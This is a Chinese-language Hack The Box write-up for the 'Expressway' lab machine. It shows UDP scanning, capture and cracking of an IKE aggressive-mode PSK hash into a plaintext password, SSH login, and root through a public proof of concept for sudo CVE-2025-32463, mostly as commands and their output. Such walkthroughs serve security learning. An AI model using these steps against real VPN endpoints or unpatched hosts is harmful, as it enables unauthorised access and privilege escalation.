---
title: HTB-Expressway
date: 2026-02-12T16:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---
> 本文章以 kali 地址为 10.10.16.41 做演示

## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                         
└─$ sudo nmap --min-rate 10000 -p- 10.129.1.84                                                           
[sudo] password for kali:                           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 00:24 EST
Nmap scan report for 10.129.1.84                                                                         
Host is up (0.12s latency).     
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE                     
22/tcp open  ssh           
                                                    
Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds
```

Nmap 扫描发现靶机的 TCP 服务仅开放 22 端口，进一步进行 UDP 端口扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sU --min-rate 10000 -p- 10.129.1.84         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 00:29 EST
Warning: 10.129.1.84 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.1.84
Host is up (0.19s latency).
Not shown: 65448 open|filtered udp ports (no-response), 86 closed udp ports (port-unreach)
PORT    STATE SERVICE
500/udp open  isakmp

Nmap done: 1 IP address (1 host up) scanned in 85.54 seconds\
```

UDP 扫描出靶机开放了 500 端口，运行的是 isakmp 服务。

ISAKMP（Internet Security Association and Key Management Protocol）是 IPsec VPN 的核心协议，运行在 UDP 500 端口。它负责在两个 VPN 端点之间建立安全通道，进行身份验证和密钥交换。

ISAKMP/IKE 有两种工作模式

- Main Mode：认证哈希是加密传输，相对安全
- Aggressive Mode：认证哈希以明文传输

如果使用的是 Aggressive Mode，则可能导致哈希泄露。

## ISAKMP 渗透

使用 `ike-scan` 捕获 `PSK` 哈希。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo ike-scan -M -A --pskcrack=enil.hash 10.129.1.84
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.1.84     Aggressive Mode Handshake returned
        HDR=(CKY-R=0b0712b44a97eb56)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.099 seconds (10.15 hosts/sec).  1 returned handshake; 0 returned notify
```

使用 `psk-crack` 破解捕捉到的哈希得到账号 `ike` 和密码 `freakingrockstarontheroad`。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                           
└─$ ls                                              
enil.hash                 
                                                    
┌──(kali㉿kali)-[~/Work/Kali]                                                                           
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt enil.hash                     
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)                         
Running in dictionary cracking mode                                                                     
key "freakingrockstarontheroad" matches SHA1 hash b4f93578606af4e183e6f0eebac53fc533232c32
Ending psk-crack: 8045040 iterations in 7.213 seconds (1115400.93 iterations/sec)
```

## Linux 提权

使用破解得到的账号密码进行 ssh 登入获得初始立足点 `ike`。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ssh ike@10.129.1.84
ike@10.129.1.84's password: 
Last login: Thu Feb 12 05:40:34 GMT 2026 from 10.10.16.41 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb 12 08:57:46 2026 from 10.10.16.41
ike@expressway:~$ whoami
ike
```

经过枚举发现靶机的 `sudo` 版本为 1.9.17，符合 `CVE-2025-32463` 的提权条件。

```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

### CVE-2025-32463

`CVE-2025-32463` 是 `sudo` 的一个关键本地权限提升漏洞，影响 sudo 1.9.14-1.9.17 版本，在 sudo 1.9.17p1 版本被修复，不影响 1.9.14 之前的旧版本。

从 github 下载编译好的源码。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                        
└─$ git clone https://github.com/MohamedKarrab/CVE-2025-32463.git
                                                    
Cloning into 'CVE-2025-32463'...
remote: Enumerating objects: 58, done.      
remote: Counting objects: 100% (58/58), done.
remote: Compressing objects: 100% (44/44), done.
remote: Total 58 (delta 27), reused 31 (delta 12), pack-reused 0 (from 0)
Receiving objects: 100% (58/58), 69.65 KiB | 298.00 KiB/s, done.
Resolving deltas: 100% (27/27), done.
```

下载到靶机中运行。

```bash
ike@expressway:/tmp$ ls -liah CVE-2025-32463/
total 28K
261 drwxrwxr-x  5 ike  ike   220 Feb 12 06:04 .
  1 drwxrwxrwt 29 root root  620 Feb 12 10:39 ..
317 drwxrwxr-x  2 ike  ike   140 Feb 12 06:04 archs-dynamic
311 drwxrwxr-x  2 ike  ike   140 Feb 12 06:04 archs-static
310 -rw-rw-r--  1 ike  ike  2.5K Feb 12 06:04 get_root.py
324 -rwxrwxr-x  1 ike  ike  1.8K Feb 12 06:04 get_root.sh
265 drwxrwxr-x  8 ike  ike   260 Feb 12 06:04 .git
264 -rw-rw-r--  1 ike  ike  4.4K Feb 12 06:04 .gitignore
323 -rw-rw-r--  1 ike  ike  1.1K Feb 12 06:04 LICENSE
263 -rwxrwxr-x  1 ike  ike   989 Feb 12 06:04 mkall-dynamic.sh
262 -rw-rw-r--  1 ike  ike  1.7K Feb 12 06:04 README.md
```

运行获得 `root`。

```bash
ike@expressway:/tmp/CVE-2025-32463$ ls
archs-dynamic  archs-static  get_root.py  get_root.sh  LICENSE  mkall-dynamic.sh  README.md
ike@expressway:/tmp/CVE-2025-32463$ ./get_root.sh 
[*] Detected architecture: x86_64
[*] Launching sudo with archs-dynamic payload …
root@expressway:/# whoami
root
```